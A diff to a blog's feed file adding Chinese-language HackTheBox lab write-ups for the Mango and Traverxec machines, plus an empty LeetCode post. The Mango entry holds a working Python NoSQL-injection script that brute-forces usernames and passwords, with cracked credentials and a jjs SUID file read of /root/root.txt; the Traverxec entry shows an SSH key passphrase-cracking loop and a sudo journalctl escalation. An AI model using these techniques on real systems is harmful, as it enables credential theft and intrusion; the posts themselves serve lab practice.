@@ -4,6 +4,73 @@
   
     
     <entry>
+      <title>HTB mango靶机实战</title>
+      <link href="/posts/73230382/"/>
+      <url>/posts/73230382/</url>
+      
+        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22端口，80端口，443端口</p><p><img src="/posts/73230382/1582967083509.png" alt></p><p>这里改一下host</p><pre><code>staging-order.mango.htb</code></pre><p>访问网站</p><p><img src="/posts/73230382/1582967236329.png" alt></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>有点坑，是mongodb，nosql注入</p><p><img src="/posts/73230382/1582967256341.png" alt></p><p>参考爆破脚本</p><pre><code class="python">#!/usr/bin/env python  import requests  import string  url = &quot;http://staging-order.mango.htb/index.php&quot;  headers = {&quot;Host&quot;: &quot;staging-order.mango.htb&quot;}  cookies = {&quot;PHPSESSID&quot;: &quot;9k6j39np56td4vq3q4lg4eh95j&quot;}  possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\&quot;+c for c in string.punctuation+string.whitespace ]  def get_password(username):      print(&quot;Extracting password of &quot; + username)      params = {&quot;username&quot;:username, &quot;password[$regex]&quot;:&quot;&quot;, &quot;login&quot;: &quot;login&quot;}      password = &quot;^&quot;      while True:          for c in possible_chars:              params[&quot;password[$regex]&quot;] = password + c + &quot;.*&quot;              pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)              if int(pr.status_code) == 302:                  password += c                  break          if c == possible_chars[-1]:              print (&quot;Found password &quot;+password[1:].replace(&quot;\\&quot;, &quot;&quot;)+&quot; for username &quot;+username)              return password[1:].replace(&quot;\\&quot;, &quot;&quot;)  def get_usernames():      usernames = []      params = {&quot;username[$regex]&quot;:&quot;&quot;, &quot;password[$regex]&quot;:&quot;.*&quot;, &quot;login&quot;: &quot;login&quot;}      for c in possible_chars:          username = &quot;^&quot; + c          params[&quot;username[$regex]&quot;] = username + &quot;.*&quot;          pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)          if int(pr.status_code) == 302:              print(&quot;Found username starting with &quot;+c)              while True:                  for c2 in possible_chars:                      params[&quot;username[$regex]&quot;] = username + c2 + &quot;.*&quot;                      if int(requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False).status_code) == 302:                          username += c2                          print(username)                          break                  if c2 == possible_chars[-1]:                      print(&quot;Found username: &quot; +username[1:])                      usernames.append(username[1:])                      break      return usernames  for u in get_usernames():      get_password(u)  </code></pre><p>爆出密码</p><p><img src="/posts/73230382/1582967279320.png" alt></p><pre><code>Found username: mangoExtracting password of adminFound password t9KcS3&gt;!0B#2 for username adminExtracting password of mangoFound password h3mXK8RhU~f{]f5H for username mango</code></pre><p>使用mango用户登陆</p><p><img src="/posts/73230382/1582967292499.png" alt></p><p>切换为admin</p><p><img src="/posts/73230382/1582967301413.png" alt></p><pre><code>userflag$ cat user.txt79bf31c6c6eb38a8567832f7f8b47e92</code></pre><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><code>sudo -l</code> 试一下</p><p><img src="/posts/73230382/1582967336806.png" alt></p><pre><code>find / -user root -perm -4000 2&gt;/dev/null</code></pre><p>寻找SUID</p><p><img src="/posts/73230382/1582967364061.png" alt></p><p>根据<a href="https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt</a></p><p><img src="/posts/73230382/1582967372531.png" alt></p><pre><code class="bash">Warning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);jjs&gt; var FileReader = Java.type(&quot;java.io.FIleReader&quot;);java.lang.RuntimeException: java.lang.ClassNotFoundException: java.io.FIleReaderjjs&gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;);jjs&gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));jjs&gt; while((line=br.readline())!=null){print(line);}&lt;shell&gt;:1 TypeError: br.readline is not a functionjjs&gt; while((line=br.readLine())!=null){print(line);}8a8ef79a7a2fbb01ea81688424e9ab15</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> HTB </tag>
+            
+            <tag> 靶机 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HTB Traverxec靶机实战</title>
+      <link href="/posts/d5bfc2a3/"/>
+      <url>/posts/d5bfc2a3/</url>
+      
+        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22号端口和80号端口</p><p><img src="/posts/d5bfc2a3/1582966595850.png" alt></p><p>看到http的信息是 <code>nostromo</code>,msf搜索exploit直接打</p><p><img src="/posts/d5bfc2a3/1582966633536.png" alt="成功得到meterpreter"></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>由于是 <code>nostromo</code> 搭建的，根目录 在 <code>/var/nostromo</code> </p><p><img src="/posts/d5bfc2a3/1582966671887.png" alt></p><p>查找conf目录</p><p><img src="/posts/d5bfc2a3/1582966693102.png" alt></p><p>查看配置文件 <code>nhttpd.conf</code></p><p><img src="/posts/d5bfc2a3/1582966726837.png" alt></p><p>发现根目录是在 public_www 下<br>是在家目录下，这个权限配置很有意思，你只能进去却看不到</p><p><img src="/posts/d5bfc2a3/1582966745190.png" alt></p><p>下载压缩包下来 <code>/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</code></p><p>解压之后就得到了私钥，但是尝试登陆还是需要密码</p><p><img src="/posts/d5bfc2a3/1582966789646.png" alt></p><p>这里就需要爆破了</p><p>可以使用john，首先需要 <code>python ssh2john.py id_rsa &gt; rsacrack</code> 转一下。但是这种方式太慢了，换一种，折耳根payload记一下</p><pre><code>cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;david@10.10.10.165&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done</code></pre><p><img src="/posts/d5bfc2a3/1582966833790.png" alt></p><p>然后登陆 密码是 hunter</p><p><img src="/posts/d5bfc2a3/1582966848699.png" alt></p><pre><code>david@traverxec:~$ cat user.txt7db0b48469606a42cec20750d9782f3d</code></pre><p>得到flag</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看到一个文件</p><pre><code class="bash">david@traverxec:~/bin$ cat server-stats.head                                                                                                                     .----.                                                                     .---------. | == |          Webserver Statistics and Data                              |.-&quot;&quot;&quot;&quot;&quot;-.| |----|                Collection Script                                    ||       || | == |                 (c) David, 2019                                     ||       || |----|                                                                     |&#39;-.....-&#39;| |::::|                                                                     &#39;&quot;&quot;)---(&quot;&quot;&#39; |___.|                                                                    /:::::::::::\&quot;    &quot;                                                                   /:::=======:::\                                                                    jgs &#39;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#39;            david@traverxec:~/bin$ cat server-stats.sh                                             #!/bin/bash                                                                            cat /home/david/bin/server-stats.head                                                  echo &quot;Load: `/usr/bin/uptime`&quot;                                                         echo &quot; &quot;                                                                               echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;               echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;    echo &quot; &quot;                                                                               echo &quot;Last 5 journal log lines:&quot;                                                       /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat                </code></pre><p>发现 <code>journalctl</code> 是用sudo执行的</p><p>提权： <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></p><pre><code># cat root.txt9aa36a6d76f785dfd320a478f6e0d906</code></pre><p><img src="/posts/d5bfc2a3/1582966978146.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整体下来感觉还行，还是要扩大知识面</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> HTB </tag>
+            
+            <tag> 靶机 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>每天一道leetcode-最长回文字串</title>
+      <link href="/posts/a99288c/"/>
+      <url>/posts/a99288c/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>vulnhub靶机渗透-Connectthedots</title>
       <link href="/posts/e4ff8385/"/>
       <url>/posts/e4ff8385/</url>
